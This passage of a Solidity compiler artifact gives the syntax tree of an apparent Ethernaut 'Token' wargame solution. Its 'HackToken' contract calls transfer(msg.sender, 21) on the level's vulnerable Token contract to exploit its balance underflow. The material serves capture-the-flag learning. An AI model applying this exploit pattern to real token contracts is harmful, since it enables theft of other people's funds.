													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "491:16:0"
									},
									"returnParameters": {
										"id": 64,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 63,
												"mutability": "mutable",
												"name": "balance",
												"nodeType": "VariableDeclaration",
												"scope": 70,
												"src": "529:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 62,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "529:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "528:14:0"
									},
									"scope": 71,
									"src": "473:106:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 72,
							"src": "60:522:0"
						}
					],
					"src": "33:549:0"
				},
				"id": 0
			},
			"contracts/ethernautTokenHack.sol": {
				"ast": {
					"absolutePath": "contracts/ethernautTokenHack.sol",
					"exportedSymbols": {
						"HackToken": [
							112
						],
						"Token": [
							71
						]
					},
					"id": 113,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 73,
							"literals": [
								"solidity",
								">=",
								"0.8",
								".0",
								"<",
								"0.9",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "35:31:1"
						},
						{
							"absolutePath": "contracts/ethernautToken.sol",
							"file": "./ethernautToken.sol",
							"id": 74,
							"nodeType": "ImportDirective",
							"scope": 113,
							"sourceUnit": 72,
							"src": "68:30:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 112,
							"linearizedBaseContracts": [
								112
							],
							"name": "HackToken",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "fc0c546a",
									"id": 77,
									"mutability": "mutable",
									"name": "token",
									"nodeType": "VariableDeclaration",
									"scope": 112,
									"src": "127:18:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Token_$71",
										"typeString": "contract Token"
									},
									"typeName": {
										"id": 76,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 75,
											"name": "Token",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 71,
											"src": "127:5:1"
										},
										"referencedDeclaration": 71,
										"src": "127:5:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Token_$71",
											"typeString": "contract Token"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 88,
										"nodeType": "Block",
										"src": "185:40:1",
										"statements": [
											{
												"expression": {
													"id": 86,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 82,
														"name": "token",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 77,
														"src": "196:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Token_$71",
															"typeString": "contract Token"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 84,
																"name": "_token",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 79,
																"src": "210:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 83,
															"name": "Token",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 71,
															"src": "204:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Token_$71_$",
																"typeString": "type(contract Token)"
															}
														},
														"id": 85,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "204:13:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Token_$71",
															"typeString": "contract Token"
														}
													},
													"src": "196:21:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Token_$71",
														"typeString": "contract Token"
													}
												},
												"id": 87,
												"nodeType": "ExpressionStatement",
												"src": "196:21:1"
											}
										]
									},
									"id": 89,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 80,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 79,
												"mutability": "mutable",
												"name": "_token",
												"nodeType": "VariableDeclaration",
												"scope": 89,
												"src": "164:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 78,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "164:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "163:16:1"
									},
									"returnParameters": {
										"id": 81,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "185:0:1"
									},
									"scope": 112,
									"src": "152:73:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 110,
										"nodeType": "Block",
										"src": "264:127:1",
										"statements": [
											{
												"assignments": [
													93
												],
												"declarations": [
													{
														"constant": false,
														"id": 93,
														"mutability": "mutable",
														"name": "_address",
														"nodeType": "VariableDeclaration",
														"scope": 110,
														"src": "275:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 92,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "275:7:1",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 96,
												"initialValue": {
													"expression": {
														"id": 94,
														"name": "msg",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967281,
														"src": "294:3:1",
														"typeDescriptions": {
															"typeIdentifier": "t_magic_message",
															"typeString": "msg"
														}
													},
													"id": 95,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "sender",
													"nodeType": "MemberAccess",
													"src": "294:10:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "275:29:1"
											},
											{
												"assignments": [
													98
												],
												"declarations": [
													{
														"constant": false,
														"id": 98,
														"mutability": "mutable",
														"name": "_value",
														"nodeType": "VariableDeclaration",
														"scope": 110,
														"src": "315:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 97,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "315:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 102,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_rational_21_by_1",
														"typeString": "int_const 21"
													},
													"id": 101,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"hexValue": "3230",
														"id": 99,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "332:2:1",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_20_by_1",
															"typeString": "int_const 20"
														},
														"value": "20"
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"hexValue": "31",
														"id": 100,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "337:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "332:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_21_by_1",
														"typeString": "int_const 21"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "315:23:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 106,
															"name": "_address",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "366:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 107,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 98,
															"src": "376:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 103,
															"name": "token",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 77,
															"src": "351:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Token_$71",
																"typeString": "contract Token"
															}
														},
														"id": 105,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 58,
														"src": "351:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 108,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "351:32:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 109,
												"nodeType": "ExpressionStatement",
												"src": "351:32:1"
											}
										]
									},
									"functionSelector": "1191c087",
									"id": 111,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "hackTransfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 90,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "254:2:1"
									},
									"returnParameters": {
										"id": 91,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "264:0:1"
									},
									"scope": 112,
									"src": "233:158:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 113,
							"src": "102:294:1"
						}
					],
					"src": "35:361:1"
				},
				"id": 1
			}
		}
	}
}